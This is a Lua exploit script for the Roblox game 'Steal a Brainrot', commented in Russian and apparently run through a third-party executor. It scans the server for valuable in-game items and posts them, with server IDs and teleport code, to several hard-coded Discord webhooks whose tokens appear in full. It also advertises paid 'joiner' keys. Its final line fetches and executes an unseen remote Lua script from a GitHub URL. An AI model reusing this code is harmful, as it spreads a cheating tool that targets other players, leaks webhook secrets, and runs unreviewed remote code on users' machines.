-- 🎯 QUANTUM FINDER v3.8 (МУЛЬТИ-ВЕБХУК СИСТЕМА)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления на разные вебхуки

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ ВЕБХУКИ
local WEBHOOKS = {
    FREE = 'https://discord.com/api/webhooks/1453729854104010772/7UXQvdJ0Dro89rKnAO_KPX8ZuCFiZTxfLbdwE3JqsZT03lZbJ5rwJFhuc96OI6X_Sm9i',
    MEDIUM = 'https://discord.com/api/webhooks/1453730100553060513/tvqeJZONQsLre8yHjFMiIvsiJse4ICsP5lXY-TXwLWPhoBYOfOHfElL9shXMNjKWA7Lz',
    HARD = 'https://discord.com/api/webhooks/1453730791266713664/vKHb28keJPXMaZUjAnwujt5ic0J0eQW4qlF-5JbwG329gOwU5LBUtpTKWaAabg21ZP6O',
    CUSTOM = 'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz',
    JOINER_MEDIUM = 'https://discord.com/api/webhooks/1453742643912642643/QZygH6Ve5Ao-d96-GpW2sViHzoj6T5IQ_HuA2SW_pYCT7Ou3dAMo5jeUWSnRoU677hVH',
    JOINER_HARD = 'https://discord.com/api/webhooks/1453742861026725980/MxiLcNVOOMfYS6V6wA7RyhyZXbS_fAReMOMenszNYNwGZV25kM9PG8aTlpeJxY2BYzLH'
}

-- 🎮 ОБЪЕКТЫ ДЛЯ КАСТОМНОГО ВЕБХУКА (порог для отправки ТОЛЬКО на ваш вебхук)
local CUSTOM_OBJECTS = {
    ['Garama and Madundung'] = { emoji = '🍝', threshold = 0 },
    ['Dragon Cannelloni'] = { emoji = '🐲', threshold = 0 },
    ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 240000000 },
    ['Esok Sekolah'] = { emoji = '🏠', threshold = 400000000 },
    ['La Supreme Combinasion'] = { emoji = '🔫', threshold = 0 },
    ['Ketupat Kepat'] = { emoji = '🍏', threshold = 180000000 },
    ['Strawberry Elephant'] = { emoji = '🐘', threshold = 0 },
    ['Spaghetti Tualetti'] = { emoji = '🚽', threshold = 500000000 },
    ['Ketchuru and Musturu'] = { emoji = '🍾', threshold = 63000000 },
    ['Tralaledon'] = { emoji = '🦈', threshold = 0 },
    ['Tictac Sahur'] = { emoji = '🕰️', threshold = 150000000 },
    ['Los Primos'] = { emoji = '🙆‍♂️', threshold = 0 },
    ['Tang Tang Keletang'] = { emoji = '📢', threshold = 300000000 },
    ['Money Money Puggy'] = { emoji = '🐶', threshold = 300000000 },
    ['Burguro And Fryuro'] = { emoji = '🍔', threshold = 0 },
    ['Chillin Chili'] = { emoji = '🌶', threshold = 200000000 },
    ['La Secret Combinasion'] = { emoji = '❓', threshold = 187500000 },
    ['Eviledon'] = { emoji = '👹', threshold = 300000000 },
    ['Spooky and Pumpky'] = { emoji = '🎃', threshold = 0 },
    ['La Spooky Grande'] = { emoji = '👻', threshold = 500000000 },
    ['Meowl'] = { emoji = '🐈', threshold = 0 },
    ['Chipso and Queso'] = { emoji = '🧀', threshold = 250000000 },
    ['La Casa Boo'] = { emoji = '👁‍🗨', threshold = 0 },
    ['Headless Horseman'] = { emoji = '🐴', threshold = 0 },
    ['Los Tacoritas'] = { emoji = '🚴', threshold = 999999999 },
    ['Capitano Moby'] = { emoji = '🚢', threshold = 0 },
    ['La Taco Combinasion'] = { emoji = '👒', threshold = 400000000 },
    ['Cooki and Milki'] = { emoji = '🍪', threshold = 0 },
    ['Los Puggies'] = { emoji = '🦮', threshold = 305000000 },
    ['Orcaledon'] = { emoji = '🐡', threshold = 240000000 },
    ['Fragrama and Chocrama'] = { emoji = '🍦', threshold = 0 },
    ['Guest 666'] = { emoji = '㊙️', threshold = 66000000 },
    ['Los Bros'] = { emoji = '📱', threshold = 300000000 },
    ['Lavadorito Spinito'] = { emoji = '📺', threshold = 250000000 },
    ['W or L'] = { emoji = '🪜', threshold = 300000000 },
    ['Fishino Clownino'] = { emoji = '🤡', threshold = 0 },
    ['Mieteteira Bicicleteira'] = { emoji = '💄', threshold = 400000000 },
    ['La Extinct Grande'] = { emoji = '☠️', threshold = 370000000 },
    ['Los Chicleteiras'] = { emoji = '🍼', threshold = 999999999 },
    ['Las Sis'] = { emoji = '☕️', threshold = 350000000 },
    ['Tacorita Bicicleta'] = { emoji = '🌮', threshold = 100000000 },
    ['Los Mobilis'] = { emoji = '📱', threshold = 400000000 },
    ['La Ginger Sekolah'] = { emoji = '🎄', threshold = 400000000 },
    ['La Jolly Grande'] = { emoji = '☃️', threshold = 400000000 },
    ['Swaggy Bros'] = { emoji = '🍹', threshold = 400000000 },
    ['Los Burritos'] = { emoji = '🌯', threshold = 250000000 },
    ['Reinito Sleighito'] = { emoji = '🦌', threshold = 0 },
    ['Dragon Gingerini'] = { emoji = '🫚', threshold = 0 },
    ['Ginger Gerat'] = { emoji = '🌑', threshold = 10000000 },
    ['Jolly Jolly Sahur'] = { emoji = '🏴‍☠️', threshold = 100000000 },
    ['Money Money Reinted'] = { emoji = '🫰', threshold = 250000000 },
}

-- 📊 ДИАПАЗОНЫ ДЛЯ ОБЫЧНЫХ ВЕБХУКОВ
local RANGES = {
    FREE = { min = 1000000, max = 10000000, color = 0x00ff00 }, -- Зеленый
    MEDIUM = { min = 10000000, max = 100000000, color = 0xffff00 }, -- Желтый
    HARD = { min = 100000000, max = math.huge, color = 0xff0000 } -- Красный
}

print('🎯 Quantum Finder v3.8 | JobId:', game.JobId)

-- 💰 ПАРСЕР ДОХОДА
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        return nil
    end
    local val = tonumber(num)
    if not val then
        return nil
    end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
            '%.1fB/s',
            v
        )):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
            '%.1fM/s',
            v
        )):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
            '%.1fK/s',
            v
        )):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    if
        inst:IsA('TextLabel')
        or inst:IsA('TextButton')
        or inst:IsA('TextBox')
    then
        local ok, ct = pcall(function()
            return inst.ContentText
        end)
        if ok and type(ct) == 'string' and #ct > 0 then
            return ct
        end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then
            return t
        end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then
            return v
        end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then
        name = grabText(display)
    end

    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end

    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then
        genText = grabText(generation)
    end

    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if
                child:IsA('TextLabel')
                or child:IsA('TextButton')
                or child:IsA('TextBox')
            then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end

    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

-- 🔍 СКАНЕРЫ
local function scanDebrisForIncome()
    local DebrisFolder = workspace:FindFirstChild("Debris")
    if not DebrisFolder then 
        print("⚠️ Debris folder not found")
        return {} 
    end

    local results = {}
    for _, inst in ipairs(DebrisFolder:GetDescendants()) do
        if inst.Name == "FastOverheadTemplate" then
            local gui = inst:FindFirstChild("GUI")
            local name = gui and grabText(gui:FindFirstChild("DisplayName")) or nil
            local genInst = gui and gui:FindFirstChild("Generation")
            local genText = genInst and grabText(genInst) or nil
            local genNum = genText and parseGenerationText(genText) or nil
            if name and genNum then
                table.insert(results, { name = name, gen = genNum })
            end
        end
    end
    return results
end

local function scanPlots()
    local results = {}
    local Plots = workspace:FindFirstChild('Plots')
    if not Plots then
        return results
    end
    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment
                    and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)
                    local genNum = genText and parseGenerationText(genText) or nil
                    if name and genNum then
                        table.insert(results, { name = name, gen = genNum })
                    end
                end
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum })
                end
            end
        end
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local function recursiveSearch(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' and not processed[child] then
                processed[child] = true
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum })
                end
            end
            pcall(function()
                recursiveSearch(child)
            end)
        end
    end
    recursiveSearch(workspace)
    return results
end

local function scanPlayerGui()
    local results = {}
    local lp = Players.LocalPlayer
    if not lp then
        return results
    end
    local playerGui = lp:FindFirstChild('PlayerGui')
    if not playerGui then
        return results
    end
    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum })
                end
            end
            pcall(function()
                searchInGui(child)
            end)
        end
    end
    searchInGui(playerGui)
    return results
end

-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}
    repeat
        collected = {}
        local allSources = {
            scanPlots(),
            scanRunway(),
            scanAllOverheads(),
            scanPlayerGui(),
            scanDebrisForIncome(),
        }
        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end
        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen)
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique
        if #collected > 0 then
            break
        end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec
    return collected
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request
        or request
        or (syn and syn.request)
        or (fluxus and fluxus.request)
        or (KRNL_HTTP and KRNL_HTTP.request)
end

-- 🔄 РАСПРЕДЕЛЕНИЕ ОБЪЕКТОВ ПО ГРУППАМ (ИСПРАВЛЕННАЯ ВЕРСИЯ)
local function categorizeObjects(objects)
    local categories = {
        FREE = {},          -- 1M - 10M
        MEDIUM = {},        -- 10M - 100M
        HARD = {},          -- 100M+
        CUSTOM = {},        -- Объекты для вашего вебхука
        JOINER_MEDIUM = {}, -- 10M - 100M для joiner вебхука
        JOINER_HARD = {}    -- 100M+ для joiner вебхука
    }
    
    -- Сначала определим, есть ли кастомные объекты на сервере
    local hasCustomObjects = false
    local customObjectsList = {}
    
    -- Проходим по всем объектам и собираем информацию о кастомных
    for _, obj in ipairs(objects) do
        if not obj.gen then
            continue
        end
        
        local customConfig = CUSTOM_OBJECTS[obj.name]
        if customConfig and obj.gen >= customConfig.threshold then
            hasCustomObjects = true
            table.insert(customObjectsList, {
                name = obj.name,
                gen = obj.gen,
                emoji = customConfig.emoji,
                threshold = customConfig.threshold
            })
        end
    end
    
    -- Если есть кастомные объекты, добавляем их только в CUSTOM категорию
    if #customObjectsList > 0 then
        categories.CUSTOM = customObjectsList
        print(string.format('✅ Found %d CUSTOM objects, they will ONLY go to CUSTOM webhook', #customObjectsList))
        
        -- Когда есть кастомные объекты, НЕ добавляем никакие объекты в FREE/MEDIUM/HARD
        -- Но для JOINER вебхуков добавляем только НЕ-кастомные объекты
        for _, obj in ipairs(objects) do
            if not obj.gen then
                continue
            end
            
            -- Проверяем, является ли объект кастомным
            local customConfig = CUSTOM_OBJECTS[obj.name]
            local isCustomObject = customConfig and obj.gen >= customConfig.threshold
            
            -- Если объект НЕ кастомный, добавляем его в JOINER категории (если подходит)
            if not isCustomObject then
                if obj.gen >= RANGES.HARD.min then
                    table.insert(categories.JOINER_HARD, obj)
                elseif obj.gen >= RANGES.MEDIUM.min and obj.gen < RANGES.MEDIUM.max then
                    table.insert(categories.JOINER_MEDIUM, obj)
                end
            end
        end
    else
        -- Если кастомных объектов нет, распределяем как обычно
        for _, obj in ipairs(objects) do
            if not obj.gen then
                continue
            end
            
            if obj.gen >= RANGES.HARD.min then
                table.insert(categories.HARD, obj)
                table.insert(categories.JOINER_HARD, obj)
            elseif obj.gen >= RANGES.MEDIUM.min and obj.gen < RANGES.MEDIUM.max then
                table.insert(categories.MEDIUM, obj)
                table.insert(categories.JOINER_MEDIUM, obj)
            elseif obj.gen >= RANGES.FREE.min and obj.gen < RANGES.FREE.max then
                table.insert(categories.FREE, obj)
            end
        end
    end
    
    return categories, hasCustomObjects
end

-- 🎨 ОТПРАВКА ОБЫЧНЫХ УВЕДОМЛЕНИЙ (на английском)
local function sendDiscordNotification(category, objects, color, botName)
    local req = getRequester()
    if not req then
        warn('❌ No HTTP API in executor')
        return
    end
    
    if #objects == 0 then
        print(string.format('⚠️ No objects for %s webhook', category))
        return
    end
    
    local jobId = game.JobId
    local placeId = game.PlaceId
    
    -- Сортируем по доходу (убывание)
    table.sort(objects, function(a, b)
        return a.gen > b.gen
    end)
    
    -- Формируем список объектов
    local objectsList = {}
    local maxDisplay = math.min(10, #objects)
    
    for i = 1, maxDisplay do
        local obj = objects[i]
        if category == 'CUSTOM' then
            -- Для кастомного вебхука используем эмодзи из CUSTOM_OBJECTS
            table.insert(
                objectsList,
                string.format(
                    '%s **%s** - %s (threshold: %s)',
                    obj.emoji or '💰',
                    obj.name,
                    formatIncomeNumber(obj.gen),
                    formatIncomeNumber(obj.threshold)
                )
            )
        else
            -- Для вебхуков 1-3 (FREE, MEDIUM, HARD) используем всегда 💰
            table.insert(
                objectsList,
                string.format(
                    '💰 **%s** - %s',
                    obj.name,
                    formatIncomeNumber(obj.gen)
                )
            )
        end
    end
    
    if #objects > maxDisplay then
        table.insert(objectsList, string.format('... and %d more objects', #objects - maxDisplay))
    end
    
    local objectsText = table.concat(objectsList, '\n')
    
    -- Телепорт команда в копируемом формате
    local teleportText = string.format(
        "```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(%d, '%s')\n```",
        placeId,
        jobId
    )
    
    -- Тайтлы для разных категорий (на английском)
    local titles = {
        FREE = '💚 FREE TIER (1M - 10M)',
        MEDIUM = '💛 MEDIUM TIER (10M - 100M)',
        HARD = '❤️ HARD TIER (100M+)',
        CUSTOM = '💎 IMPORTANT OBJECTS'
    }
    
    -- Для вебхуков 1-3 (FREE, MEDIUM, HARD) отправляем только телепорт команду, без отдельного Job ID
    local fields = {}
    
    if category == 'FREE' or category == 'MEDIUM' or category == 'HARD' then
        -- Только для 1-3 вебхуков: убираем отдельный Job ID, оставляем только телепорт команду
        fields = {
            {
                name = '📊 Objects:',
                value = objectsText,
                inline = false,
            },
            {
                name = '🚀 Teleport:',
                value = teleportText,
                inline = false,
            },
        }
    else
        -- Для CUSTOM вебхука отправляем всё как было
        fields = {
            {
                name = '🆔 Server (Job ID)',
                value = string.format('```%s```', jobId),
                inline = false,
            },
            {
                name = '📊 Objects:',
                value = objectsText,
                inline = false,
            },
            {
                name = '🚀 Teleport:',
                value = teleportText,
                inline = false,
            },
        }
    end
    
    local payload = {
        username = botName,
        embeds = {
            {
                title = titles[category] or '💰 Quantum Finder',
                color = color,
                fields = fields,
                footer = {
                    text = string.format(
                        'Found: %d objects • %s',
                        #objects,
                        os.date('%H:%M:%S')
                    ),
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }
    
    print(string.format('📤 Sending to %s webhook: %d objects', category, #objects))
    
    local ok, res = pcall(function()
        local response = req({
            Url = WEBHOOKS[category],
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
        
        print(string.format('📡 HTTP Response Code: %s', response.StatusCode))
        return response
    end)
    
    if ok then
        print('✅ Notification sent successfully!')
    else
        warn('❌ Send error:', res)
        print(string.format('❌ Failed to send to %s webhook', category))
    end
end

-- 🎨 ОТПРАВКА JOINER УВЕДОМЛЕНИЙ (только на английском)
local function sendJoinerNotification(category, objects, color, botName)
    local req = getRequester()
    if not req then
        warn('❌ No HTTP API in executor')
        return
    end
    
    if #objects == 0 then
        print(string.format('⚠️ No objects for %s webhook', category))
        return
    end
    
    -- Сортируем по доходу (убывание)
    table.sort(objects, function(a, b)
        return a.gen > b.gen
    end)
    
    -- Формируем список объектов
    local objectsList = {}
    local maxDisplay = math.min(10, #objects)
    
    for i = 1, maxDisplay do
        local obj = objects[i]
        -- Для joiner вебхуков ВСЕГДА используем 💰
        table.insert(
            objectsList,
            string.format(
                '💰 **%s** - %s',
                obj.name,
                formatIncomeNumber(obj.gen)
            )
        )
    end
    
    if #objects > maxDisplay then
        table.insert(objectsList, string.format('... and %d more objects', #objects - maxDisplay))
    end
    
    local objectsText = table.concat(objectsList, '\n')
    
    -- Реклама ключа (упрощенная)
    local advertisement = "**Want to join such servers? Buy a key for our joiner:**\nhttps://discord.com/channels/1452341247086952724/1453742218291580948"
    
    -- Тайтлы для joiner категорий
    local titles = {
        JOINER_MEDIUM = '💛 MEDIUM TIER SERVER (10M - 100M)',
        JOINER_HARD = '❤️ HARD TIER SERVER (100M+)'
    }
    
    local payload = {
        username = botName,
        embeds = {
            {
                title = titles[category] or '💰 Joiner Notification',
                color = color,
                fields = {
                    {
                        name = '📊 Objects on server:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = '🔑 Server access:',
                        value = advertisement,
                        inline = false,
                    },
                },
                footer = {
                    text = string.format(
                        'Found: %d objects • %s',
                        #objects,
                        os.date('%H:%M:%S')
                    ),
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }
    
    print(string.format('📤 Sending to %s webhook: %d objects', category, #objects))
    
    local ok, res = pcall(function()
        local response = req({
            Url = WEBHOOKS[category],
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
        
        print(string.format('📡 HTTP Response Code: %s', response.StatusCode))
        return response
    end)
    
    if ok then
        print('✅ Joiner notification sent successfully!')
    else
        warn('❌ Joiner send error:', res)
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Scanning all objects...')
    
    local allFound = collectAll(8.0)
    
    if #allFound == 0 then
        print('❌ No objects found')
        return
    end
    
    print(string.format('📊 Total objects found: %d', #allFound))
    
    -- Выводим все найденные объекты для отладки
    print('\n📋 ALL FOUND OBJECTS:')
    for i, obj in ipairs(allFound) do
        print(string.format('   %d. %s: %s', i, obj.name, formatIncomeNumber(obj.gen)))
    end
    
    -- Категоризация объектов с учетом наличия кастомных
    print('\n🔍 Categorizing objects...')
    local categories, hasCustomObjects = categorizeObjects(allFound)
    
    -- Отправка уведомлений с учетом логики приоритета
    print('\n📤 Sending notifications...')
    
    if hasCustomObjects then
        print('⚠️ CUSTOM objects found, skipping FREE/MEDIUM/HARD webhooks')
        -- Отправляем только CUSTOM вебхук
        sendDiscordNotification('CUSTOM', categories.CUSTOM, 0x2f3136, 'Brainrot Scanner')
    else
        -- Если нет кастомных объектов, отправляем все обычные вебхуки
        sendDiscordNotification('FREE', categories.FREE, RANGES.FREE.color, 'Quantum Finder')
        sendDiscordNotification('MEDIUM', categories.MEDIUM, RANGES.MEDIUM.color, 'Quantum Finder')
        sendDiscordNotification('HARD', categories.HARD, RANGES.HARD.color, 'Quantum Finder')
    end
    
    -- Отправка joiner уведомлений (они всегда отправляются, но содержат только не-кастомные объекты)
    sendJoinerNotification('JOINER_MEDIUM', categories.JOINER_MEDIUM, 0xffff00, 'Server Joiner')
    sendJoinerNotification('JOINER_HARD', categories.JOINER_HARD, 0xff0000, 'Server Joiner')
    
    -- Вывод в консоль
    print('\n📊 DISTRIBUTION REPORT:')
    print(string.format('   FREE (1M-10M): %d objects', #categories.FREE))
    print(string.format('   MEDIUM (10M-100M): %d objects', #categories.MEDIUM))
    print(string.format('   HARD (100M+): %d objects', #categories.HARD))
    print(string.format('   CUSTOM (important): %d objects', #categories.CUSTOM))
    print(string.format('   JOINER_MEDIUM (10M-100M): %d objects', #categories.JOINER_MEDIUM))
    print(string.format('   JOINER_HARD (100M+): %d objects', #categories.JOINER_HARD))
    
    if hasCustomObjects then
        print('🎯 CUSTOM objects have priority: FREE/MEDIUM/HARD webhooks are disabled')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === QUANTUM FINDER v3.8 ===')
print('💡 Multi-webhook system with priorities')
print('📊 Ranges: FREE(1M-10M) | MEDIUM(10M-100M) | HARD(100M+)')
print('💎 Custom objects go ONLY to CUSTOM webhook, NOT to FREE/MEDIUM/HARD')
print('💰 FREE/MEDIUM/HARD/JOINER: All objects with 💰 emoji | CUSTOM: Custom emojis')
print('🔑 Joiner notifications for 10M+ and 100M+')
print('🚀 Webhooks 1-3: Teleport command only | Webhook 4: Full info')

-- Показываем кастомные пороги
print('\n📊 CUSTOM THRESHOLDS:')
for name, cfg in pairs(CUSTOM_OBJECTS) do
    print(string.format('   %s %s: %s', cfg.emoji, name, formatIncomeNumber(cfg.threshold)))
end
print('')

scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan, DEBOUNCE = 0, 3
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then
        return
    end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.clock()
        if now - lastScan < DEBOUNCE then
            return
        end
        lastScan = now
        print('\n🔄 === RESCAN (F) ===')
        scanAndNotify()
    end
end)

print('💡 Press F to rescan')
print('🎨 Colors: Green(FREE) | Yellow(MEDIUM) | Red(HARD)')
print('🤖 Bots: Quantum Finder (FREE/MEDIUM/HARD) | Brainrot Scanner (CUSTOM) | Server Joiner (JOINER)')
print('💰 Emoji: All objects on FREE/MEDIUM/HARD/JOINER webhooks use 💰 emoji')

-- Загрузка дополнительного скрипта
loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
